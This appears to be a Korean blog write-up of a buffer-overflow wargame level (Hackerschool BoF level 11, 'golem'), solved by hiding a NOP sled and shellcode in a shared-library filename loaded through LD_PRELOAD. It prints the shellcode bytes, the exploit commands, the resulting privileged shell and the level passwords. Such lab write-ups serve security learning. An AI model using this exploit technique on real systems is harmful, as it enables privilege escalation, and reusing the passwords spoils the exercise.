---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL11 (Skeleton -> Golem) : Stack Destroyer"
date: 2015-11-15 22:03:10
category: wargame
tags:  bof 
---

- id = skeleton
- pw = shellcoder

<!--more--> 

## 1. 문제 : golem.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - golem
        - stack destroyer
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // stack destroyer!
        memset(buffer, 0, 44);
        memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
}
```

### 1.1 변경된 코드

으악… buffer[40] 뒤에 LR 이후부터 stack bottom까지 모두 0으로 clear 시킨다. 즉, shellcode 를 stack 에 올려놓고 실행을 할 수 없다는 것이다. 그렇다면… ROP (Return-Oriented Programming)이나 return-to-libc 기법으로 기존 코드를 재활용하여 shellcode 동작시켜야 할 것 같다.

```c
// stack destroyer!
        memset(buffer, 0, 44);
        memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
```

## 2. 공격 방법 고민

물론 ROP도 가능하겠지만 이것은 아마도 맨 뒤에 나올 듯 하고, 이보다 쉽게 접근 가능한 방법이 바로 공유 라이브러리를 이용하는 것인가보다. 사실 이 방법은 잘 몰라서 힌트를 좀 봤다. :)

프로그램에서 stack 을 다 초기화시키고 있지만 공유라이브러리 사용을 부분에 지워지지 않는 부분이 있는 듯 하다. 파일을 shared library 로 compile 하여 사용하고, 이 파일 이름에 shellcode 를 올려 놓고, 여기 가르키도록 공격을 할 예정이다.

### 2.1 shared library compile 할 소스

사실 이번에 중요한 것은 공유라이브러리로 올리가는 object 의 파일 이름.

```c
void shell() {}
```

## 2.2 shared library compile

- fPIC : Position Indepedent Code
- shared : shared library

```bash
$ gcc shellcode.c -fPIC -shared -o `python -c 'print "\x90"*200 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`

>  file `python -c 'print "\x90"*200 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`  
hù¿@hà@¸à@PÃ: ELF 32-bit LSB shared object, Intel 80386, version 1, not stripped
```

## 2.3 LD_PRELOAD 에 등록

```
export LD_PRELOAD="./`python -c 'print "\x90"*200 + "\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`"
```

## 2.4 디버깅

### 2.4.1 Stack bottom

마지막 ret 하기 이전 stack 상황. 모드 clear 된 상태.

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage11-1.png)

### 2.4.2 LD_PRELOAD 내용은 어디에 ?

사실 LD_PRELOAD로 설정된 내용이 메모리 어디에 잡히는지 아직 잘 모르겠다. 현재 Stack 윗 메모리 중에 해당 내용이 잡혀 있긴 하다.

![img](https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage11-3.png)

## 3. 공격

LR 값은 0xbffff770 으로 선택.

```bash
$ ./golem `python -c 'print "A"*44 + "\x70\xf7\xff\xbf"'`    

bash$ id
uid=510(skeleton) gid=510(skeleton) euid=511(golem) egid=511(golem) groups=510(skeleton)
```

## 4. 다음 단계 정보

```bash
bash$ id
uid=510(skeleton) gid=510(skeleton) euid=511(golem) egid=511(golem) groups=510(skeleton)

bash$ my-pass
euid = 511
cup of coffee
```

## 5. 의문점

#### LD_PRELOAD 관련 위치

ldd 로 확인해본 위치로는 0x40015000 에 잡혀있네요. 이번 문제에서는 LR이 0xbfff---- 을 사용해야 하므로 이 값은 쓸 수 없겠네요. Stack 위에도 이 값이 copy 되어 잡히게 되는 것인가요 ?

```
$ ldd /bin/ls
        ./hù¿@hà@¸à@PÃ => ./hù¿@hà@¸à@PÃ (0x40015000)
        libtermcap.so.2 => /lib/libtermcap.so.2 (0x4001a000)
        libc.so.6 => /lib/libc.so.6 (0x4001e000)
        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
```

##### NOP 앞 부분 jump 시 fault

NOP 를 200 bytes 로 충분히 넣었는데, 앞부분으로 jump 하면 fault 가 발생하네요. Stack 위치 계산이 틀어져서 약간 오차가 있는 것이 잘 모르겠네요…

```
// Fault
>  ./golem `python -c 'print "A"*44 + "\x20\xf7\xff\xbf"'`  
Program received signal SIGSEGV, Segmentation fault.
0x40032942 in __libc_start_main (main=???, argc=???, argv=???, init=???,
    fini=???, rtld_fini=???, stack_end=???)
    at ../sysdeps/generic/libc-start.c:73
73      ../sysdeps/generic/libc-start.c: No such file or directory.  

// OK
>  ./golem `python -c 'print "A"*44 + "\x24\xf7\xff\xbf"'`
```




